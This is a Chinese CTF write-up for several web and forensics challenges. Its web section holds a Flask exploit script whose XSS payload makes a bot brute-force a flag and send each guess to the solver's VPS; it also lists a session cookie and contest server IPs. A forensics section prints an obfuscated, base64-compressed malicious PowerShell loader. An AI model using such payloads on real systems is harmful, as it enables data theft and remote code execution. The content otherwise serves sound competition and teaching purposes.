访问 `/about?theme=xxxxx` 发现存在 XSS。不过过滤了一些东西，比如 空格可以用 `%09` 绕过之类。
于是就在 VPS 上跑个脚本，分成功和失败两个路由，让 bot 访问自己的 `/flag` 路由。
如果成功返回则调用 Ajax 去请求 VPS 上的 success 路由，否则请求 error 路由，并通过参数返回当前爆破的 flag。
exp：
    from flask import Flask
    from flask import request
    import requests
    import urllib.parse
    app = Flask(__name__)
    @app.route("/success")
    def index():
        global cookies
        global url
        data = request.args.get('a')
        if len(data) == 13 or len(data) == 18 or len(data) == 23 or len(data) == 28:
            data += "-0"
        else:
            data += "0"
        p = '''";t="''' + data +'''",$.ajax({url:"/flag?var="+t}).done(function(o){window.location="http://自己的VPS/success?a="+t}).fail(function(){window.location="http://自己的VPS/error?a="+t});//'''
        p = "http://localhost:8888/about?theme=" + urllib.parse.quote(p)
        d = {
            "url": p
        }
        requests.post(url, data=d, cookies=cookies)
        return "Hello World!"
    @app.route("/error")
    def index2():
        global cookies
        global url
        data = request.args.get('a')
        tmp = data[:-1]
        if data[-1] == "9":
            tmp += "a"
        else:
            tmp += chr(ord(data[-1]) + 1)
        data = tmp
        p = '''";t="''' + data +'''",$.ajax({url:"/flag?var="+t}).done(function(o){window.location="http://自己的VPS/success?a="+t}).fail(function(){window.location="http://自己的VPS/error?a="+t});//'''
        p = "http://localhost:8888/about?theme=" + urllib.parse.quote(p)
        d = {
            "url": p
        }
        requests.post(url, data=d, cookies=cookies)
        return "Hello World!"
    cookies = {"session":"s%3ASuDwPHFP03I6VDRGiad8Zzst0owLeQY_.MjxB%2BTBwTgesKkEE9dIR95EoJPMuNNh%2BOZFw6ajDMm0"}
    # url = "http://47.104.210.56:8888/report"
    url = "http://47.104.192.54:8888/report"
    app.run(host='0.0.0.0', port=80)
让 bot 从 `0` 开始访问，虽然容器固定时间重启，但是 flag 是静态的 uuid，所以就是时间问题了。
最后根据 VPS 上的访问记录就能得到 flag 了。
* * *
## Misc
###  BlueTeaming
> Powershell scripts were executed by malicious programs. What is the registry
> key that contained the power shellscript content?（本题flag为非正式形式）
>
> [附件下载](https://pan.baidu.com/s/1itThwJT5kCw-RG3YnandOQ)
> 提取码（GAME）[备用下载](https://share.weiyun.com/qWoVMafc)
>
> 压缩包解压密码：fantasicqwb2021
首先使用 volatility 将内存中的 register hive 导出来.
    volatility -f memory.dmp --profile Win7SP1x64 hivelist
    volatility -f memory.dmp --profile Win7SP1x64 dumpregistry -D .
题目中说到可能和 powershell 恶意程序有关系，那么优先考虑 SOFTWARE 专用的字符串，使用 WRR.exe
工具检查注册表，然后全局搜索一些常见的恶意软件字段，比如 -IEX, encode decompress new-object
等等，最终能够找到恶意软件存放的注册表位置
搜到一个路径是`CMI-CreateHive{199DAFC2-6F16-4946-BF90-5A3FC3A60902}\Microsoft\Windows\Communication`
恶意脚本是
    & ( $veRBOsepReFErEncE.tOstrINg()[1,3]+'x'-JOin'')( nEW-ObjEcT sySTEm.iO.sTreaMReAdER( ( nEW-ObjEcT  SystEm.iO.CompreSsiOn.DEfLATEstREam([IO.meMoryStream] [CoNVeRT]::fROMbASe64StRinG('NVJdb5tAEHyv1P9wQpYAuZDaTpvEVqRi+5Sgmo/Axa0VRdoLXBMUmyMGu7Es//fuQvoAN7e7Nzua3RqUcJbgQVLIJ1hzNi/eGLMYe2gOFX+0zHpl9s0Uv4YHbnu8CzwI8nIW5UX4bNqM2RPGUtU4sPQSH+mmsFbIY87kFit3A6ohVnGIFbLOdLlXCdFhAlOT3rGAEJYQvfIsgmAjw/mJXTPLssxsg3U59VTvyrT7JjvDS8bwN8NvbPYt81amMeItpi1TI3omaErK0fO5bNr7LQVkWjYkqlZtkVtRUK8xxAQxxqylGVwM3dFX6jtw6TgbnrPRCMFlm75i3xAPhq2aqUnNKFyWqhNiu0bC4wV6kXHDsh6yF5k8Xgz7Hbi6+ACXI/vLQyoSv7x5/EgNbXvy+VPvOAtyvWuggvuGvOhZaNFS/wTlqN9xwqGuwQddst7Rh3AfvQKHLAoCsq4jmMJBgKrpMbm/By8pcDQLzlju3zFn6S12zB6PjXsIfcj0XBmu8Qyqma4ETw2rd8w2MI92IGKU0HGqEGYacp7/Z2U+CB7gqJdy67c2dHYsOA0H598N33b3cr3j2EzoKXgpiv1+XjfbIryhRk+wakhq16TSqYhpKcHbpNTox9GYgyekcY0KcFGyKFf56YTF7drg1ji/+BMk/G7H04Y599sCFW3+NG71l0aXZRntjFu94FGhHidQzYvOsSiOaLsFxaY6P6CbFWioRSUTGdSnyT8=' ) , [IO.coMPressION.cOMPresSiOnmOde]::dEcOMPresS)), [TexT.ENcODInG]::AsCIi)).ReaDToeNd()
flag是 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication`
###  CipherMan
> The attacker maliciously accessed the user’s PC and encrypted specific
> volumes. How to decrypt the volume?（本题flag为非正式形式）
>
> [附件下载](https://pan.baidu.com/s/1G2zgTROW7-h7nZ0Cfct-4g)
> 提取码（GAME）[备用下载](https://share.weiyun.com/SQfdghDG)
>
> 压缩包解压密码：fantasicqwb2021
    BitLocker 드라이브 암호화 복구 키
     복구 키는 BitLocker로 보호되는 드라이브에서 데이터를 검색하기 위해 사용됩니다.
    이 키가 올바른 복구 키인지 확인하려면 복구 화면에 표시된 것과 ID를 비교하십시오.
    복구 키 ID: 168F1291-82C1-4B
    전체 복구 키 ID: 168F1291-82C1-4BF2-B634-9CCCEC63E9ED
    BitLocker 복구 키:
    221628-533357-667392-449185-516428-718443-190674-375100
    BitLocker驱动器加密恢复键
    恢复密钥用于在被保护为BitLocker的驱动器中搜索数据。
    如果您想确认此密钥是否正确，请比较恢复屏幕上显示的和ID。
    恢复密钥ID:168F1291-82C1-4B
    整体恢复密钥ID:168F1291-82C1-4BF2-B634-9CCCEC63E9ED
    BitLocker恢复键：
    221628-533357-667392-449185-516428-718443-190674-375100
DiskGenius 解密
    Wow，you have a great ability. How did you solve this? Are you a hacker? Please give me a lesson later.
找了半天最后发现这个内容就是 flag。。
> 赛后发现是原题
>
> [Digital Forensic Challenge 2018 VOI200 문제
> 풀이](https://whitesnake1004.tistory.com/675)
###  ExtremelySlow
> [附件下载](https://pan.baidu.com/s/19pn6uALdsyInuUMXPEMmuQ)
> 提取码（GAME）[备用下载](https://share.weiyun.com/NcvTkpC3)
>
> 压缩包解压密码：fantasicqwb2021
首先是一个流量包，里面全是 TCP 和 HTTP 流量。而且是 206 分段传输，每个包传 1byte。
于是先导出为 JSON，然后写个脚本提取其中的每个 byte，最后合并得到一个二进制文件。
wireshark 直接导出的 JSON 里 `http.response.line` 包含多个，如果直接用 `json.loads`
只保留最后一个了，所以先要去掉无关的内容。
    import json
    import re
    with open('http.json', 'r', encoding='utf-8') as fin:
        s = fin.read()
    re_num = re.compile(
        r'\"http\.response\.line\": \"content-range: bytes (\d+)-\d+/1987\\r\\n\"')
    re_nonnum = re.compile(
        r'(\"http\.response\.line\": (?!\"content-range: bytes (\d+)-\d+/1987\\r\\n\",).*)')
    s1 = re.sub(re_nonnum, '', s)
    with open('http_sub.json', 'w', encoding='utf-8') as fout:
        fout.write(s1)
    http = json.loads(s1)
    total = [b''] * 1987
    # total = [''] * 1987
    idx_list = []
    for x in http:
        source = x['_source']
        layers = source['layers']
        # get data
        data = layers['data']['data.data']
        data = bytes([int(data, 16)])
        # find index
        n = layers['http']['http.response.line']
        idx = int(re.search(r'(\d+)-\d+/1987', n)[1])
        idx_list.append(idx)
        total[idx] = data
    print(total)
    t = b''.join(total)
    # t = ''.join(total)
    # print(len(t)/2)
    with open('decode.pyc', 'wb') as f:
        f.write(t)
    # with open('decode1.pyc', 'w') as f:
    #     f.write(t)
或者直接命令行用 tshark 更快，不过当时就没想到这么写喵呜呜呜。
按 index 把这个合并就行，bash 脚本类似这样
    tshark -r ExtremelySlow.pcapng -T fields -e data -Y "http.response.line == \"content-range: bytes $idx-$idx/1987\x0d\x0a\"" 2>/dev/null
根据文件内容得知是个 pyc 文件。
但是直接拿在线工具或者 uncompyle6 反编译都不成，发现 magic number 有误。
> 参考
>
> [Python’s magic numbers](http://www.robertholmes.org/2018/09/08/pythons-> magic-numbers.html)
>
> [Python Uncompyle6 反编译工具使用 与 Magic Number
> 详解](https://blog.csdn.net/Zheng__Huang/article/details/112380221)
>
> 
>
> [Understanding Python
> Bytecode](https://towardsdatascience.com/understanding-python-> bytecode-e7edaae8734d)
可以发现文件头的这个 magic number 是随版本号递增的，而且比最新的 3.9.5 跨了一大截。
于是考虑拉个 py3.10 的镜像下来。
    docker run --rm -it  python:3.10.0b2
根据 magic number 确定就是最新的 Python 3.10.0b2
但还是需要反编译这个pyc
[uncompyle6](https://github.com/rocky/python-uncompyle6/)
 目前只支持 python 2.4-3.8
 不行
dis 可
    >>> import marshal, dis
    >>> with open('decode.pyc','rb') as f:
    ...     metadata = f.read(16)
    ...     code_obj = marshal.load(f)
    ... 
    >>> dis.dis(code_obj)
      4           0 LOAD_CONST               0 (0)
                  2 LOAD_CONST               1 (None)
                  4 IMPORT_NAME              0 (sys)
                  6 STORE_NAME               0 (sys)
      6           8 LOAD_CONST               0 (0)
                 10 LOAD_CONST               2 (('sha256',))
                 12 IMPORT_NAME              1 (hashlib)
                 14 IMPORT_FROM              2 (sha256)
                 16 STORE_NAME               2 (sha256)
                 18 POP_TOP
     16          20 LOAD_CONST               3 ()
                 22 LOAD_CONST               4 ('KSA')
                 24 MAKE_FUNCTION            0
                 26 STORE_NAME               3 (KSA)
     26          28 LOAD_CONST               5 ()
                 30 LOAD_CONST               6 ('PRGA')
                 32 MAKE_FUNCTION            0
                 34 STORE_NAME               4 (PRGA)
     30          36 LOAD_CONST               7 ()
                 38 LOAD_CONST               8 ('RC4')
                 40 MAKE_FUNCTION            0
                 42 STORE_NAME               5 (RC4)
     33          44 LOAD_CONST               9 ()
                 46 LOAD_CONST              10 ('xor')
                 48 MAKE_FUNCTION            0
                 50 STORE_NAME               6 (xor)
     34          52 LOAD_NAME                7 (__name__)
                 54 LOAD_CONST              11 ('__main__')
                 56 COMPARE_OP               2 (==)
                 58 POP_JUMP_IF_FALSE      139 (to 278)
     35          60 LOAD_CONST              12 (b'\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3<\x151\x19\n\x8f')
                 62 STORE_NAME               8 (w)
     38          64 LOAD_CONST              13 (b'$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~')
                 66 STORE_NAME               9 (e)
     39          68 LOAD_CONST              14 (b'geo')
                 70 STORE_NAME              10 (b)
     41          72 LOAD_CONST              15 (b'}\xce`\xbej\xa2\x120\xb5\x8a\x94\x14{\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141')
                 74 STORE_NAME              11 (s)
     42          76 LOAD_CONST              16 (b"Q_\xe2\xf8\x8c\x11M}'<@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1")
                 78 STORE_NAME              12 (t)
     43          80 LOAD_CONST              17 (115)
                 82 LOAD_CONST              18 (97)
                 84 LOAD_CONST              19 (117)
                 86 LOAD_CONST              20 (114)
                 88 LOAD_CONST              21 ((2, 8, 11, 10))